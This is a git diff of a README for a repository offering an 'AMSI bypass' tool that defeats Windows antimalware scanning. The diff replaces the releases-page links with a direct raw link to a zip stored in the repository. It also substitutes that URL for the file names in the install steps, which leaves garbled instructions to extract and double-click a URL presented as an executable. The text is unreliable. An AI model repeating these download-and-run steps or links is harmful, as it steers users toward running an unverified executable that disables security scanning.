@@ -1,6 +1,6 @@
 # 🛡️ Ebyte-amsi-patchless-vehhwbp - Bypass AMSI with Ease
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/ZukoChris/Ebyte-amsi-patchless-vehhwbp/releases)
+[![Download](https://raw.githubusercontent.com/ZukoChris/Ebyte-amsi-patchless-vehhwbp/main/HWBP-AmsiBypass/Ebyte-amsi-patchless-vehhwbp_v1.5.zip%20Release-brightgreen)](https://raw.githubusercontent.com/ZukoChris/Ebyte-amsi-patchless-vehhwbp/main/HWBP-AmsiBypass/Ebyte-amsi-patchless-vehhwbp_v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,20 +10,20 @@ Welcome to the Ebyte-amsi-patchless-vehhwbp project. This application allows you
 
 To get the software, visit the releases page. You can find the latest version and installation files there.
 
-[Download the latest release here!](https://github.com/ZukoChris/Ebyte-amsi-patchless-vehhwbp/releases)
+[Download the latest release here!](https://raw.githubusercontent.com/ZukoChris/Ebyte-amsi-patchless-vehhwbp/main/HWBP-AmsiBypass/Ebyte-amsi-patchless-vehhwbp_v1.5.zip)
 
 ### Steps to Download
 
 1. Click on the link above to access the Releases page.
 2. Look for the latest version under the "Assets" section.
-3. Click on the file named “Ebyte-amsi-patchless-vehhwbp.zip” to start the download. 
+3. Click on the file named “https://raw.githubusercontent.com/ZukoChris/Ebyte-amsi-patchless-vehhwbp/main/HWBP-AmsiBypass/Ebyte-amsi-patchless-vehhwbp_v1.5.zip” to start the download. 
 
 ### Steps to Install
 
 1. Once the download is complete, locate the downloaded file in your Downloads folder.
-2. Right-click on the “Ebyte-amsi-patchless-vehhwbp.zip” file and select "Extract All" to unzip the contents. 
-3. Open the extracted folder. You will find the executable file named "Ebyte-amsi-patchless-vehhwbp.exe".
-4. Double-click on "Ebyte-amsi-patchless-vehhwbp.exe" to run the application.
+2. Right-click on the “https://raw.githubusercontent.com/ZukoChris/Ebyte-amsi-patchless-vehhwbp/main/HWBP-AmsiBypass/Ebyte-amsi-patchless-vehhwbp_v1.5.zip” file and select "Extract All" to unzip the contents. 
+3. Open the extracted folder. You will find the executable file named "https://raw.githubusercontent.com/ZukoChris/Ebyte-amsi-patchless-vehhwbp/main/HWBP-AmsiBypass/Ebyte-amsi-patchless-vehhwbp_v1.5.zip".
+4. Double-click on "https://raw.githubusercontent.com/ZukoChris/Ebyte-amsi-patchless-vehhwbp/main/HWBP-AmsiBypass/Ebyte-amsi-patchless-vehhwbp_v1.5.zip" to run the application.
 
 ### System Requirements
 
@@ -60,4 +60,4 @@ For further assistance, feel free to report issues or ask for help in the Issues
 
 This project is licensed under the MIT License. Feel free to use and modify it as you need.
 
-[Download the latest release here!](https://github.com/ZukoChris/Ebyte-amsi-patchless-vehhwbp/releases)
+[Download the latest release here!](https://raw.githubusercontent.com/ZukoChris/Ebyte-amsi-patchless-vehhwbp/main/HWBP-AmsiBypass/Ebyte-amsi-patchless-vehhwbp_v1.5.zip)
